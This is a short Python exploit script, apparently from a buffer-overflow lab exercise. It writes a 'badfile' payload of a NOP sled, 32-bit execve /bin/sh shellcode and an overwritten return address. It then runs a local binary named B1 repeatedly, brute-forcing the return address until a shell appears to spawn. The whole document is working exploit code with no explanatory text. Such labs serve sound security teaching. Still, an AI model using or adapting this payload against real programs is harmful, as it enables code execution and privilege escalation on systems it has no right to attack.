#!/usr/bin/python3
import sys
def get_content(num):
  # Replace the content with the actual shellcode
  shellcode= (
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
    "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
    "\xd2\x31\xc0\xb0\x0b\xcd\x80"
  ).encode('latin-1')

  # Fill the content with NOP's
  content = bytearray(0x90 for i in range(344)) 

  ##################################################################
  # Put the shellcode somewhere in the payload
  start = 300 - len(shellcode)               # Change this number 
  content[start:start + len(shellcode)] = shellcode
  


  # Decide the return address value 
  # and put it somewhere in the payload
  ret    = 0xffffd204 + num    # Change this number 
  offset = 328              # Change this number

  #print('ret is = ' , hex(ret))
  L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
  # BUF_SIZE = 528
  
  # spray_start = start + len(shellcode) 
  # spray_start = spray_start + (4 - (spray_start) % 4) + 16
  # for offset in range(spray_start, BUF_SIZE, L):
  content[offset:offset + L] = (ret).to_bytes(L,byteorder='little')
  content[offset+2*L:offset + 3*L]=(0xffffffff).to_bytes(L,byteorder='little')
  content[offset+3*L:offset + 4*L]=(0x0000000f).to_bytes(L,byteorder='little')
  return content 
##################################################################

# Write the content to a file

for  i in range(10, 200, 1): 
    with open('badfile', 'wb') as f:
      print('i = ', i)
      f.write(get_content(i))
    import os, time

    s = time.time()

    import subprocess
    subprocess.call(['./B1'])
    if time.time() - s > 1.0:
      break